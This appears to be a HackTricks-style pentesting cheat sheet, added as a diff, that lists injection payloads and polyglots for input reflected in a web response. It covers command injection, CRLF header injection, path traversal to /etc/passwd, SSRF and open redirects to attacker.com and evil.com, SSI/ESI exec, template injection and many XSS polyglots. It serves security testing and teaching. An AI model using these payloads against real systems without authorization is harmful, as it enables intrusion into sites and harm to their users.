@@ -1,0 +1,251 @@
+# Reflecting Techniques - PoCs and Polygloths CheatSheet
+
+{{#include ../../banners/hacktricks-training.md}}
+
+These PoCs and polyglots give testers a fast **summary** of vulnerabilities to check when **input is reflected in a response**. The collection draws on the linked HackTricks technique pages and established payload/testing collections.<sup>[[1]](#references)</sup><sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>
+
+> [!WARNING]
+> This **cheat sheet is not a comprehensive test suite**. Follow the linked vulnerability page for prerequisites, context-specific payloads, and validation guidance.
+
+> [!CAUTION]
+> It omits `Content-Type`-dependent injections such as XXE and database-specific injections, because those tests depend heavily on the request format, backend technology, and query structure.
+
+## Polyglots list <sup>[[1]](#references)</sup>
+
+```python
+{{7*7}}[7*7]
+1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
+%0d%0aLocation:%20http://attacker.com
+%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
+%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
+%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
+<br><b><h1>THIS IS AN INJECTED TITLE </h1>
+/etc/passwd
+../../../../../../etc/hosts
+..\..\..\..\..\..\etc/hosts
+/etc/hostname
+../../../../../../etc/hosts
+C:/windows/system32/drivers/etc/hosts
+../../../../../../windows/system32/drivers/etc/hosts
+..\..\..\..\..\..\windows/system32/drivers/etc/hosts
+http://asdasdasdasd.burpcollab.com/mal.php
+\\asdasdasdasd.burpcollab.com/mal.php
+www.whitelisted.com
+www.whitelisted.com.evil.com
+https://google.com
+//google.com
+javascript:alert(1)
+(\\w*)+$
+([a-zA-Z]+)*$
+((a+)+)+$
+<!--#echo var="DATE_LOCAL" --><!--#exec cmd="ls" --><esi:include src=http://attacker.com/>x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>
+{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}${{<%[%'"}}%\
+<xsl:value-of select="system-property('xsl:version')" /><esi:include src="http://10.10.10.10/data/news.xml" stylesheet="http://10.10.10.10//news_template.xsl"></esi:include>
+" onclick=alert() a="
+'"><img src=x onerror=alert(1) />
+javascript:alert()
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+-->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>
+">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/index.html) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm( 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
+" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
+```
+
+## [Client Side Template Injection](../client-side-template-injection-csti.md)
+
+### Basic Tests
+
+```
+{{7*7}}
+[7*7]
+```
+
+### Polygloths
+
+```bash
+{{7*7}}[7*7]
+```
+
+## [Command Injection](../command-injection.md)
+
+### Basic Tests
+
+```bash
+;ls
+||ls;
+|ls;
+&&ls;
+&ls;
+%0Als
+`ls`
+$(ls)
+```
+
+### Polygloths
+
+```bash
+1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
+```
+
+## [CRLF](../crlf-0d-0a.md)
+
+### Basic Tests
+
+```bash
+%0d%0aLocation:%20http://attacker.com
+%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
+%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
+%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
+```
+
+## Dangling Markup
+
+### Basic Tests
+
+```html
+<br><b><h1>THIS IS AND INJECTED TITLE </h1>
+```
+
+## [File Inclusion/Path Traversal](../file-inclusion/index.html)
+
+### Basic Tests
+
+```bash
+/etc/passwd
+../../../../../../etc/hosts
+..\..\..\..\..\..\etc/hosts
+/etc/hostname
+../../../../../../etc/hosts
+C:/windows/system32/drivers/etc/hosts
+../../../../../../windows/system32/drivers/etc/hosts
+..\..\..\..\..\..\windows/system32/drivers/etc/hosts
+http://asdasdasdasd.burpcollab.com/mal.php
+\\asdasdasdasd.burpcollab.com/mal.php
+```
+
+## [Open Redirect](../open-redirect.md) / [Server Side Request Forgery](../ssrf-server-side-request-forgery/index.html)
+
+### Basic Tests
+
+```bash
+www.whitelisted.com
+www.whitelisted.com.evil.com
+https://google.com
+//google.com
+javascript:alert(1)
+```
+
+## [ReDoS](../regular-expression-denial-of-service-redos.md)
+
+### Basic Tests
+
+```bash
+(\\w*)+$
+([a-zA-Z]+)*$
+((a+)+)+$
+```
+
+## [Server Side Inclusion/Edge Side Inclusion](../server-side-inclusion-edge-side-inclusion-injection.md)
+
+### Basic Tests
+
+```html
+<!--#echo var="DATE_LOCAL" -->
+<!--#exec cmd="ls" -->
+<esi:include src=http://attacker.com/>
+x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>
+```
+
+### Polygloths
+
+```html
+<!--#echo var="DATE_LOCAL" --><!--#exec cmd="ls" --><esi:include src=http://attacker.com/>x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>
+```
+
+## [Server Side Request Forgery](../ssrf-server-side-request-forgery/index.html)
+
+The same tests used for Open Redirect can be used here.
+
+## [Server Side Template Injection](../ssti-server-side-template-injection/index.html)
+
+### Basic Tests
+
+```html
+${{<%[%'"}}%\
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+```
+
+### Polygloths
+
+```python
+{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}${{<%[%'"}}%\
+```
+
+## [XSLT Server Side Injection](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
+
+### Basic Tests
+
+```html
+<xsl:value-of select="system-property('xsl:version')" />
+<esi:include src="http://10.10.10.10/data/news.xml" stylesheet="http://10.10.10.10//news_template.xsl"></esi:include>
+```
+
+### Polygloths
+
+```html
+<xsl:value-of select="system-property('xsl:version')" /><esi:include src="http://10.10.10.10/data/news.xml" stylesheet="http://10.10.10.10//news_template.xsl"></esi:include>
+```
+
+## XSS
+
+### Basic Tests
+
+```html
+" onclick=alert() a="
+'"><img src=x onerror=alert(1) />
+javascript:alert()
+```
+
+### Polygloths
+
+```html
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+-->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/index.html) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm( 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
+" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
+<svg%0Ao%00nload=%09((pro\u006dpt))()//
+javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/--><svg/onload=/*<html/*/onmouseover=alert()//>
+javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>--><svg onload=/*<html/*/onmouseover=alert()//>
+javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template><svg/onload='/*--><html */ onmouseover=alert()//'>`
+%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert(test)//'">`
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+document.location=`//localhost/mH`//'>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=document.location=`//localhost/mH`//>
+```
+
+## References
+
+- [1] [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+- [2] [PortSwigger Web Security Academy](https://portswigger.net/web-security/all-materials)
+- [3] [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
+
+{{#include ../../banners/hacktricks-training.md}}
